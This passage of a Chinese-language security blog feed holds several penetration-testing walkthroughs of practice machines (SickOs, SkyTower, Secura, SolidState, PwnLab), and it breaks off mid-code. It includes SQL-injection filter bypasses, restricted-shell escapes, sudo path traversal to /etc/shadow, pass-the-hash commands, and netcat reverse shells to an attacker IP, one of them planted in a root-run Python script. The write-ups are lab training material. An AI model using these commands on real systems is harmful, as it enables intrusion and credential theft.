<p>0.8.2 后台存在文件上传漏洞，但需要登陆后台，幸运的是，弱口令直接试出来了，是 admin&#x2F;admin</p>
<p><img src="/picture/image-20250415170207828.png" alt="image-20250415170207828"></p>
<p>可以直接在 Files 处没有限制的上传文件，这里上传的是 kali 自带的更改 ip 和 port 后的 php-reverse-shell.php </p>
<p>从标题中不难发现，上传至 public 目录</p>
<p><img src="/picture/image-20250415170809740.png" alt="image-20250415170809740"></p>
<p>成功上传</p>
<p><img src="/picture/image-20250415170900207.png" alt="image-20250415170900207"></p>
<p>kali 开启 nc 监听，点击访问 php 文件，即可接收到反弹回来的 shell ，并将其升级为 TTY shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250415171146164.png" alt="image-20250415171146164"></p>
<p>接下来是提权，通过 <code>netstat -tln</code> 发现目标主机运行了 3306 端口</p>
<p><img src="/picture/image-20250415171908364.png" alt="image-20250415171908364"></p>
<p>在 WolfCMS 的 config.php 中可以发现 MySQL 的账号和密码</p>
<p><img src="/picture/image-20250415172057575.png" alt="image-20250415172057575"></p>
<p>登陆目标主机 mysql 服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u root -p</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250415172200514.png" alt="image-20250415172200514"></p>
<p>可惜查看一圈并没有泄露信息，由于开放 SSH 服务，我们可以考虑尝试密码喷洒，那就要知道用户名，在 &#x2F;etc&#x2F;passwd 中找到已登录的用户名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@SickOs:/var/www$ cat /etc/passwd | grep bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash</span><br></pre></td></tr></table></figure>

<p>用户名是 sickos ，尝试 SSH 远程登陆账户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh sickos@192.168.186.153</span><br></pre></td></tr></table></figure>

<p>成功登陆</p>
<p><img src="/picture/image-20250415183135168.png" alt="image-20250415183135168"></p>
<p>发现 sickos 可以使用 sudo 执行所有命令</p>
<p><img src="/picture/image-20250415183317566.png" alt="image-20250415183317566"></p>
<p>使用如下命令提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sudo /bin/bash</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img src="/picture/image-20250415183426600.png" alt="image-20250415183426600"></p>
<p>获得 flag</p>
<p><img src="/picture/image-20250415183518567.png" alt="image-20250415183518567"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>SkyTower Walkthrough</title>
    <url>/2025/04/17/SkyTower/</url>
    <content><![CDATA[<h1 id="SkyTower-Walkthrough"><a href="#SkyTower-Walkthrough" class="headerlink" title="SkyTower Walkthrough"></a>SkyTower Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/skytower-1,96/">SkyTower: 1</a></p>
<p><img src="/picture/image-20250418152722834.png" alt="image-20250418152722834"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>由于官网只给了 vbox 文件，需要将其导入 Vitrual Box 后导出 ova 文件才能放在 VM 内运行</p>
<p><img src="/picture/image-20250418152102380.png" alt="image-20250418152102380"></p>
<p><img src="/picture/image-20250418152157821.png" alt="image-20250418152157821"></p>
<p>确定存活的主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.186.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250418103910286.png" alt="image-20250418103910286"></p>
<p>对目标 IP 进行端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.157</span><br></pre></td></tr></table></figure>

<p>发现开放 80，3128 端口，22 端口处于 filter 状态</p>
<p><img src="/picture/image-20250418103928629.png" alt="image-20250418103928629"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 22,80,3128 -sC -sV 192.168.186.157</span><br></pre></td></tr></table></figure>

<p>80 端口开放 http 服务，3128 开放 http-proxy 代理服务</p>
<p><img src="/picture/image-20250418104051596.png" alt="image-20250418104051596"></p>
<p>先来看 80 端口，进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.157/ </span><br></pre></td></tr></table></figure>

<p>仅发现 login 页面</p>
<p><img src="/picture/image-20250418104119438.png" alt="image-20250418104119438"></p>
<p>访问 192.168.186.157 主页面，发现是登陆页面，而 &#x2F;login.php 需要登录才能访问</p>
<p>先来看看主页面是否存在 SQL 注入？在 email 和 passwd 输入 <code>&#39;&quot;</code> 尝试闭合引号，回显 SQL error ，说明存在 SQL 注入，而且是以单引号闭合</p>
<p><img src="/picture/image-20250418104909754.png" alt="image-20250418104909754"></p>
<p>试试看能不能用万能密码登陆？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email=&#x27; or 1=1%20%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p>看报错，服务端将等号过滤了，同时将 or 替换为空</p>
<p><img src="/picture/image-20250418105407429.png" alt="image-20250418105407429"></p>
<p>既然是替换为空，不妨试试双写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email=&#x27; oorr 1 like 1 %23&amp;password=123</span><br></pre></td></tr></table></figure>

<p>显而易见，成功了，返回了 john 的账号和密码 john&#x2F;hereisjohn 且提示我们这是他 SSH 的账号密码</p>
<p><img src="/picture/image-20250418110846414.png" alt="image-20250418110846414"></p>
<p>由于之前 SSH 默认端口 22 是出于 filter 状态，且存在 http-proxy 代理服务，猜测 22 端口需要经过 http 代理才能访问</p>
<p>编辑 proxychains 代理文件，添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http 192.168.186.157 3128</span><br></pre></td></tr></table></figure>

<p>并将原来的 sock4 代理注释掉</p>
<p><img src="/picture/image-20250418111423346.png" alt="image-20250418111423346"></p>
<p>nmap 经过 proxychains 代理进行内网全端口探测，看看是否存在开放端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -p- -sT 192.168.186.157 2&gt;&amp;1 | grep -v &quot;denied&quot;</span><br></pre></td></tr></table></figure>

<p>发现 22 端口开放，且开放 SSH 服务</p>
<p><img src="/picture/image-20250418113217132.png" alt="image-20250418113217132"></p>
<p>使用 proxychains 代理进行 SSH 远程连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains ssh john@192.168.186.157</span><br></pre></td></tr></table></figure>

<p>发现刚建立的连接马上就断了，说明处在一个 restrict 环境中，需要逃逸</p>
<p><img src="/picture/image-20250418113347934.png" alt="image-20250418113347934"></p>
<p>尝试逃逸 restrict shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-t &quot;/bin/sh&quot;</span><br><span class="line">-t &quot;/bin/bash&quot;</span><br><span class="line">-t &quot;bash - noprofile&quot;</span><br><span class="line">-t &quot;() &#123; :; &#125;; /bin/bash&quot;</span><br></pre></td></tr></table></figure>

<p>使用 <code>-t &quot;/bin/sh&quot;</code> 成功逃逸</p>
<p><img src="/picture/image-20250418135848110.png" alt="image-20250418135848110"></p>
<p>由于目标主机没有 python 和 python3 ，不能获得 TTY shell</p>
<p>发现目标主机在本地开放了 MySQL 服务</p>
<p><img src="/picture/image-20250418140550244.png" alt="image-20250418140550244"></p>
<p>由于我们是通过 MySQL 注入获得 john 的账号密码的，尝试在源代码中读取到目标主机 MySQL 账号密码</p>
<p><img src="/picture/image-20250418141001829.png" alt="image-20250418141001829"></p>
<p>登陆目标主机 MySQL 服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -proot</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250418141201836.png" alt="image-20250418141201836"></p>
<p>收集 SkyTech 数据库信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| SkyTech            |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; use SkyTech;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+-------------------+</span><br><span class="line">| Tables_in_SkyTech |</span><br><span class="line">+-------------------+</span><br><span class="line">| login             |</span><br><span class="line">+-------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * from login;</span><br><span class="line">+----+---------------------+--------------+</span><br><span class="line">| <span class="built_in">id</span> | email               | password     |</span><br><span class="line">+----+---------------------+--------------+</span><br><span class="line">|  1 | john@skytech.com    | hereisjohn   |</span><br><span class="line">|  2 | sara@skytech.com    | ihatethisjob |</span><br><span class="line">|  3 | william@skytech.com | senseable    |</span><br><span class="line">+----+---------------------+--------------+</span><br></pre></td></tr></table></figure>

<p>发现 email 部分的人名和目标主机已登录的用户一致，同时发现 john 的账号密码和用于登陆 SSH 的账号密码一致，这里是否存在密码复用？</p>
<p>只有 sara 能登陆</p>
<p><img src="/picture/image-20250418150035606.png" alt="image-20250418150035606"></p>
<p>查看 sara 能执行的 sudo 命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>发现 sara 具有无需密码以 root 身份读取 <code>/accounts/*</code> 文件和需要密码以 root 身份列出 <code>/accounts/*</code> 文件的 sudo 权限</p>
<p><img src="/picture/image-20250418151527977.png" alt="image-20250418151527977"></p>
<p>借助<strong>系统允许文件名包含路径遍历字符</strong>来进行路径遍历，读取 &#x2F;etc&#x2F;shadow 中 root 加密后的密码来破解，但 hashcat 没跑出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /accounts/../../etc/shadow</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250418150610867.png" alt="image-20250418150610867"></p>
<p>那就借助 ls 列举 root 目录中文件，结合 cat 读取看看能不能泄露机密信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo <span class="built_in">ls</span> /accounts/../../root            </span><br><span class="line">flag.txt</span><br><span class="line">$ sudo <span class="built_in">cat</span> /accounts/../../root/flag.txt</span><br><span class="line">Congratz, have a cold one to celebrate!</span><br><span class="line">root password is theskytower</span><br></pre></td></tr></table></figure>

<p>&#x2F;root 中仅存在 flag.txt ，内容是 root 账户的密码</p>
<p>直接 su 切换至 root 身份</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ su root</span><br><span class="line">root@SkyTower:/home/sara<span class="comment"># cd ~</span></span><br><span class="line">root@SkyTower:~<span class="comment"># ls -la</span></span><br><span class="line">root@SkyTower:~<span class="comment"># cat flag.txt</span></span><br></pre></td></tr></table></figure>

<p>读取 flag</p>
<p><img src="/picture/image-20250418151215847.png" alt="image-20250418151215847"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Resolute Record</title>
    <url>/2025/05/06/Secura01/</url>
    <content><![CDATA[<h1 id="Secura01"><a href="#Secura01" class="headerlink" title="Secura01"></a>Secura01</h1><p>使用 enum4linux 对目标主机进行默认用户名密码检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux -a 192.168.152.95</span><br></pre></td></tr></table></figure>

<p>不允许默认用户名密码</p>
<p><img src="/picture/image-20250503150753222.png" alt="image-20250503150753222"></p>
<p>使用 nxc 查看 Eric.Wallows 是否在目标主机 smb 服务拥有权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc smb 192.168.152.95 --shares -u Eric.Wallows -p EricLikesRunning800</span><br></pre></td></tr></table></figure>

<p>显示 Pwn3d 说明当前使用的账户 Eric.Wallows 通过 SMB 协议对目标主机 192.168.152.95 具有 <strong>系统级权限</strong></p>
<p>无需进一步提权，即可直接执行任意命令、访问敏感文件或控制系统</p>
<p><img src="/picture/image-20250503155440036.png" alt="image-20250503155440036"></p>
<p>使用 impacket-secretsdump 提取本地 SAM 哈希和域凭据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump &#x27;secura.yzx/Eric.Wallows:EricLikesRunning800@192.168.152.95&#x27;</span><br></pre></td></tr></table></figure>

<p>回显 Administrator 密码哈希</p>
<p><img src="/picture/image-20250503154236536.png" alt="image-20250503154236536"></p>
<p>使用 impacket-psexec 进行 PtH 攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:a51493b0b06e5e35f855245e71af1d14 administrator@192.168.102.95</span><br><span class="line">evil-winrm -i 192.168.102.95 -u administrator -H &quot;a51493b0b06e5e35f855245e71af1d14&quot;</span><br></pre></td></tr></table></figure>

<p>获得 .95 目标主机的 SYSTEM 账户</p>
<p><img src="/picture/image-20250503155921519.png" alt="image-20250503155921519"></p>
<p>在 Administrator 的桌面发现 proof.txt</p>
<p><img src="/picture/image-20250503160812848.png" alt="image-20250503160812848"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>AD</tag>
      </tags>
  </entry>
  <entry>
    <title>SolidState Walkthrough</title>
    <url>/2025/04/03/SolidState/</url>
    <content><![CDATA[<h1 id="SolidState-Walkthrough"><a href="#SolidState-Walkthrough" class="headerlink" title="SolidState Walkthrough"></a>SolidState Walkthrough</h1><h2 id="box-info"><a href="#box-info" class="headerlink" title="box info"></a>box info</h2><p><img src="/picture/image-20250311182630924.png" alt="image-20250311182630924"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>对目标主机进行端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.35</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250209114134707.png" alt="image-20250209114134707"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,25,80,110,119,4555 -A 172.16.33.35</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250209114225570.png" alt="image-20250209114225570"></p>
<p>发现 ssh 服务（22），SMTP、pop3 邮箱服务（25、110），http 服务（80），nntp 网络新闻传输服务（119），以及高位端口 4555 。</p>
<blockquote>
<p>SMTP 用于电子邮件的<strong>发送</strong>（服务器到服务器或客户端到服务器）。它是标准的邮件传输端口，通常不加密，但可通过STARTTLS升级加密</p>
<p>POP3 用于从邮件服务器<strong>下载邮件到本地客户端</strong> 。默认不加密</p>
</blockquote>
<p>先从 80 端口 HTTP 服务开始，直接访问页面，发现聊天框，但是 action 的值为 # ，未能与客户端、服务端产生交互，是一个 花瓶 </p>
<p><img src="/picture/image-20250209153921682.png" alt="image-20250209153921682"></p>
<p>但是发现邮箱以及 IP 对应的域名，尝试用域名访问：</p>
<blockquote>
<p>用 IP 和域名访问的结果可能会大不相同</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/hosts</span><br></pre></td></tr></table></figure>

<p>添加如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.16.33.35	solid-state-security.com</span><br><span class="line">172.16.33.35	www.solid-state-security.com</span><br></pre></td></tr></table></figure>

<p>回显相同，猜测失败</p>
<p>查看源码，为静态页面。源码中的链接下面都能通过 dirsearch 枚举出来</p>
<p>尝试 dirsearch 扫一扫：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.35/</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250209155851057.png" alt="image-20250209155851057"></p>
<p>扫描出来的左右内容都没什么有价值的内容</p>
<p>gobuster：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://172.16.33.35/ -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure>

<p>emm… 啥啥都没有</p>
<p><img src="/picture/image-20250209160553754.png" alt="image-20250209160553754"></p>
<p>80 端口的 http 页面似乎没有漏洞，那就看看运行的  JAMES 2.3.2 有无漏洞</p>
<p>能搜到有 RCE 漏洞，看看能不能直接利用：</p>
<p><img src="/picture/image-20250209161535859.png" alt="image-20250209161535859"></p>
<p>大致意思是创建名为 <code>../../../../../../../../etc/bash_completion.d</code> 的用户并将 payload 作为邮件内容发送给他</p>
<blockquote>
<p>只要别的用户登录这台主机，就会自动加载、执行 &#x2F;etc&#x2F;bash_completion.d 中的文件</p>
</blockquote>
<p>但是即使成功写入，本台靶机也没有后台进程登录这台主机，执行不了写入的 webshell ，</p>
<p>再来看 4555 端口，使用默认账密 root&#x2F;root ，尝试用 telnet 连接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet 172.16.33.35 4555</span><br></pre></td></tr></table></figure>

<blockquote>
<p>或者用 nc ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nv -C 172.16.33.35 110</span><br></pre></td></tr></table></figure>
</blockquote>
<p>成功：</p>
<p><img src="/picture/image-20250311134220443.png" alt="image-20250311134220443"></p>
<p>查看存在的用户：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">listusers</span><br><span class="line">Existing accounts 5</span><br><span class="line">user: james</span><br><span class="line">user: thomas</span><br><span class="line">user: john</span><br><span class="line">user: mindy</span><br><span class="line">user: mailadmin</span><br></pre></td></tr></table></figure>

<p>使用 setpassword 将所有存在用户密码设置为 12345</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setpassword james 12345</span><br><span class="line">setpassword thomas 12345</span><br><span class="line">setpassword john 12345</span><br><span class="line">setpassword mindy 12345</span><br><span class="line">setpassword mailadmin 12345</span><br></pre></td></tr></table></figure>

<p>查看邮件内容，在 pop3 服务上分别查看存在用户的邮件是否存在以及是否泄露隐藏信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet 172.16.33.35 110</span><br></pre></td></tr></table></figure>

<p>查看 james ，没有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER james</span><br><span class="line">+OK</span><br><span class="line">PASS 12345</span><br><span class="line">+OK Welcome james</span><br><span class="line">LIST 1</span><br><span class="line">-ERR Message (1) does not exist.</span><br><span class="line">LIST</span><br><span class="line">+OK 0 0</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>查看 thomas ，没有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER thomas </span><br><span class="line">+OK</span><br><span class="line">PASS 12345 </span><br><span class="line">+OK Welcome thomas</span><br><span class="line">LIST</span><br><span class="line">+OK 0 0</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>查看 john ，发现有一个邮件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER john</span><br><span class="line">+OK</span><br><span class="line">PASS 12345</span><br><span class="line">+OK Welcome john</span><br><span class="line">LIST</span><br><span class="line">+OK 1 743</span><br><span class="line">1 743</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>查看文件内容，似乎说明了 mindy 的邮件泄露了他账号的密码</p>
<p><img src="/picture/image-20250311140800670.png" alt="image-20250311140800670"></p>
<p>查看 mindy ，发现有两篇邮件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER mindy</span><br><span class="line">+OK</span><br><span class="line">PASS 12345</span><br><span class="line">+OK Welcome mindy</span><br><span class="line">LIST</span><br><span class="line">+OK 2 1945</span><br><span class="line">1 1109</span><br><span class="line">2 836</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>第一篇在祝贺她被录用</p>
<p><img src="/picture/image-20250311140934063.png" alt="image-20250311140934063"></p>
<p>第二篇找到她的 ssh 账户和密码：</p>
<p><img src="/picture/image-20250311141052051.png" alt="image-20250311141052051"></p>
<p>再看看 mailadmin ，没有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER mailadmin</span><br><span class="line">+OK</span><br><span class="line">PASS 12345</span><br><span class="line">+OK Welcome mailadmin</span><br><span class="line">LIST</span><br><span class="line">+OK 0 0</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>已知 mindy 账号和密码，使用 ssh 登陆：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh mindy@172.16.33.35 </span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250311141955855.png" alt="image-20250311141955855"></p>
<p>获得 user.txt ：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250311144133653.png" alt="image-20250311144133653"></p>
<p>输入一些命令时能看到回显的 rbash 标志，需要 rbash 逃逸</p>
<p><img src="/picture/image-20250311144552167.png" alt="image-20250311144552167"></p>
<p>尝试 ssh 登录时逃逸：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh mindy@172.16.33.35 -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure>

<p>再次输入 sudo -l ，逃逸成功：</p>
<p><img src="/picture/image-20250311144911661.png" alt="image-20250311144911661"></p>
<blockquote>
<p>或者使用 netexec 逃逸 rbash ，同时开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ssh 172.16.33.35 -u mindy -p &#x27;P@55W0rd1!2@&#x27; -x &#x27;nc 10.8.0.71 1234 -e /bin/bash&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250209170922621.png" alt="image-20250209170922621"></p>
<p><img src="/picture/image-20250209170942930.png" alt="image-20250209170942930"></p>
</blockquote>
<p>在 Interesting writable files 中，我们会看到 <strong>&#x2F;opt&#x2F;tmp.py</strong> 文件可以由我们写入并且具有 root 权限。</p>
<p><img src="/picture/image-20250311174536822.png" alt="image-20250311174536822"></p>
<p>所有人能修改，所有人为 root </p>
<p><img src="/picture/image-20250209171509612.png" alt="image-20250209171509612"></p>
<p>该终端功能不完整，不能进行交互式编辑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">     os.system(<span class="string">&#x27;rm -r /tmp/* &#x27;</span>)</span><br><span class="line">     os.system(<span class="string">&#x27;nc 10.8.0.71 8023 -e /bin/bash&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">     sys.exit()</span><br></pre></td></tr></table></figure>

<p>将内容保存至本地，增加反弹 shell 语句</p>
<p><img src="/picture/image-20250311180548022.png" alt="image-20250311180548022"></p>
<p>上传至目标主机并用 cp 覆盖原本靶机：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.8.0.71:8888/tmp.py</span><br><span class="line">cp tmp.py /opt/tmp.py</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250311180912900.png" alt="image-20250311180912900"></p>
<p>最多等待 5 分钟 getshell 并取得 root.txt</p>
<p><img src="/picture/image-20250311181018959.png" alt="image-20250311181018959"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>THM</tag>
      </tags>
  </entry>
  <entry>
    <title>PwnLab init Walkthrough</title>
    <url>/2025/04/16/PwnLab%20init/</url>
    <content><![CDATA[<h1 id="PwnLab-init-Walkthrough"><a href="#PwnLab-init-Walkthrough" class="headerlink" title="PwnLab: init Walkthrough"></a>PwnLab: init Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/pwnlab-init,158/">PwnLab: init</a></p>
<p><img src="/picture/image-20250416214806073.png" alt="image-20250416214806073"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.186.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250416202642869.png" alt="image-20250416202642869"></p>
<p>对目标 IP 进行端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.154</span><br></pre></td></tr></table></figure>

<p>发现开放 80，111，3306，39907 端口</p>
<p><img src="/picture/image-20250416202723984.png" alt="image-20250416202723984"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 80,111,3306,39907 -sC -sV 192.168.186.154</span><br></pre></td></tr></table></figure>

<p>80 端口开放 http 服务，111 端口开放 rpcbind 服务且开放 39907&#x2F;tcp 服务 status ，3306 端口开放 mysql</p>
<p><img src="/picture/image-20250416202902802.png" alt="image-20250416202902802"></p>
<p>先来看 80 端口，进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.154/ </span><br></pre></td></tr></table></figure>

<p>发现 config.php 但是内容为 0 ，没有权限访问，同时发现 images、upload、login 页面</p>
<p><img src="/picture/image-20250416203724302.png" alt="image-20250416203724302"></p>
<p>发现 login 页面 url 为 <code>http://192.168.186.154/?page=login</code> </p>
<p><img src="/picture/image-20250416203940398.png" alt="image-20250416203940398"></p>
<p>尝试路径遍历 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd ，可惜失败了</p>
<p><img src="/picture/image-20250416204104178.png" alt="image-20250416204104178"></p>
<p>有 MySQL 注入吗？也没有</p>
<p><img src="/picture/image-20250416204151714.png" alt="image-20250416204151714"></p>
<p>结合空白的 config.php ，看看能否 filter 协议读取文件，config.php 返回的是空白的，结合 upload 的 url 路径，尝试读取 config</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.186.154/?page=php://filter/convert.base64-encode/resource=config</span><br></pre></td></tr></table></figure>

<p>获得加密后的 config.php </p>
<p><img src="/picture/image-20250416204540747.png" alt="image-20250416204540747"></p>
<p>解密后为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$server</span>	  = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;H4u%QJ_H99&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;Users&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>尝试登陆 login 页面，但是失败，尝试登陆 MySQL </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p -h 192.168.186.154 --skip-ssl</span><br></pre></td></tr></table></figure>

<p>在 User 数据库 users 数据表中发现三位用户加密后的密码</p>
<p><img src="/picture/image-20250416204948681.png" alt="image-20250416204948681"></p>
<p>解密后为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------+------------------+</span><br><span class="line">| user | pass             |</span><br><span class="line">+------+------------------+</span><br><span class="line">| kent | JWzXuBJJNy       |</span><br><span class="line">| mike | SIfdsTEn6I       |</span><br><span class="line">| kane | iSv5Ym2GRo       |</span><br><span class="line">+------+------------------+</span><br></pre></td></tr></table></figure>

<p>尝试登陆 &#x2F;login 界面，kent 的账号密码就登陆成功了，直接上传 php 文件失败了，那就来看看 upload 的源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.186.154/?page=php://filter/convert.base64-encode/resource=upload</span><br></pre></td></tr></table></figure>

<p>解密后为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;user&#x27;])) &#123; die(&#x27;You must be log in.&#x27;); &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action=&#x27;&#x27; method=&#x27;post&#x27; enctype=&#x27;multipart/form-data&#x27;&gt;</span><br><span class="line">            &lt;input type=&#x27;file&#x27; name=&#x27;file&#x27; id=&#x27;file&#x27; /&gt;</span><br><span class="line">            &lt;input type=&#x27;submit&#x27; name=&#x27;submit&#x27; value=&#x27;Upload&#x27;/&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php </span><br><span 